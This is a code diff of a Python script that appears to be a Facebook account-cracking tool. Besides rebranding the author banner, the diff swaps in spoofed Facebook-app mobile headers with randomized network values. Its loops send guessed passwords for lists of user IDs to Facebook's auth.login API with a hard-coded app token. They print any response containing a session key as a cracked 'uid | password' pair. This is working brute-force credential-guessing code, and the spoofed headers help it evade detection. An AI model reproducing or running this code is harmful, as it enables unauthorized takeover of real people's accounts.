@@ -402,12 +402,12 @@ logo = """
                                
 \x1b[1;93m----------------------------------------------------------------------------------------------------------------------
 \033[1;97m═════════════════════════════════════╮
-\x1b[1;93m[+] 𝗔𝗨𝗧𝗛𝗢𝗥   :MAFIA                   \033[1;32m║
-\x1b[1;93m[+] 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 :MAFIA                 \033[1;32m║
-\x1b[1;92m[+] 𝗚𝗜𝗧𝗛𝗨𝗕   :(Criminal313)                       \033[1;32m║
+\x1b[1;93m[+] 𝗔𝗨𝗧𝗛𝗢𝗥   :IRTAZA & ALI                   \033[1;32m║
+\x1b[1;93m[+] 𝗙𝗔𝗖𝗘𝗕𝗢𝗢𝗞 :M.MOSHIN.                  \033[1;32m║
+\x1b[1;92m[+] 𝗚𝗜𝗧𝗛𝗨𝗕   :(IRTAZAHA)                       \033[1;32m║
 \x1b[1;93m[+] TEAM     \x1b[1;92m:(ALONE)            \033[1;32m║
-\x1b[1;93m[+] WHATSAPP :(+93783361438)           \033[1;32m║
-\x1b[1;93m[+] 𝗩𝗘𝗥𝗦𝗜𝗢𝗡  :    1.1                         \033[1;32m║
+\x1b[1;93m[+] WHATSAPP :(92303*********)           \033[1;32m║
+\x1b[1;93m[+] 𝗩𝗘𝗥𝗦𝗜𝗢𝗡  :    1.0.2                              \033[1;32m║
 \033[1;93m═════════════════════════════════════╯
 """
  
@@ -436,7 +436,7 @@ class Main:
 			print("    Thanks♥️")
 			exit()
 		elif Baloch in ["1", "01"]:
-			os.system("xdg-open  https://www.facebook.com/profile.php?id=100000600244990&mibextid=ZbWKwL")
+			os.system("xdg-open  https://facebook.com/groups/678356470596560/")
 			print("")
 			time.sleep(3.0)
 			print("\033[1;37m    CHECKING APPROVAL ")
@@ -444,7 +444,7 @@ class Main:
 			input("\n\033[1;37m TYPE THE NAME  \033[1;37m")
 			time.sleep(3.1)
 			print("")
-			print("\033[1;32m WELCOME TO MAFIA   TOOLS")
+			print("\033[1;32m WELCOME TO MMS   TOOLS")
 			time.sleep(3.0)
 			os.system("clear")
 		print(logo)
@@ -878,29 +878,16 @@ class Main:
 		for pw in pwx:
 			pw = pw.lower()
 			ses = requests.Session()
-            headers = {
-    'authority': 'www.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    # 'cookie': 'datr=3b3iZTYMXaN9VcWGqCpGZ2ec; sb=3b3iZdhRdQ5MGjXias9sY67r; ps_l=0; ps_n=0; vpd=v1%3B578x314x3.43505597114563; oo=v1; locale=en_US; m_pixel_ratio=3.43505597114563; wl_cbv=v2%3Bclient_version%3A2458%3Btimestamp%3A1712475657; dpr=3.7835533618927; fr=1KBJ9oOPgo4cePG8z.AWUxFFBmtraI1J3CiKd7Euce2-E.BmBq2I..AAA.0.0.BmEk5q.AWWelSBQioA; wd=980x1800',
-    'dpr': '2.75',
-    'referer': 'https://www.facebook.com/',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-model': '""',
-    'sec-ch-ua-platform': '"Linux"',
-    'sec-ch-ua-platform-version': '""',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-    'viewport-width': '980',
-}
+			headers = {
+				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
+				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
+				"x-fb-net-hni": str(random.randint(20000, 40000)), 
+				"x-fb-connection-quality": "EXCELLENT",
+				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
+				"user-agent": rua, 
+				"content-type": "application/x-www-form-urlencoded", 
+				"x-fb-http-engine": "Liger"
+			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
 				print("\r \033[1;32m[MMS-OK]%s | %s\033[1;32m         "%(uid, pw))
@@ -1323,28 +1310,15 @@ class Main:
 			pw = pw.lower()
 			ses = requests.Session()
 			headers = {
-    'authority': 'www.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    # 'cookie': 'datr=3b3iZTYMXaN9VcWGqCpGZ2ec; sb=3b3iZdhRdQ5MGjXias9sY67r; ps_l=0; ps_n=0; vpd=v1%3B578x314x3.43505597114563; oo=v1; locale=en_US; m_pixel_ratio=3.43505597114563; wl_cbv=v2%3Bclient_version%3A2458%3Btimestamp%3A1712475657; dpr=3.7835533618927; fr=1KBJ9oOPgo4cePG8z.AWUxFFBmtraI1J3CiKd7Euce2-E.BmBq2I..AAA.0.0.BmEk5q.AWWelSBQioA; wd=980x1800',
-    'dpr': '2.75',
-    'referer': 'https://www.facebook.com/',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-model': '""',
-    'sec-ch-ua-platform': '"Linux"',
-    'sec-ch-ua-platform-version': '""',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-    'viewport-width': '980',
-}
+				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
+				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
+				"x-fb-net-hni": str(random.randint(20000, 40000)), 
+				"x-fb-connection-quality": "EXCELLENT",
+				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
+				"user-agent": rua, 
+				"content-type": "application/x-www-form-urlencoded", 
+				"x-fb-http-engine": "Liger"
+			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
 				print("\r \033[1;32m[MMS] %s | %s\033[0;32m         "%(uid, pw))
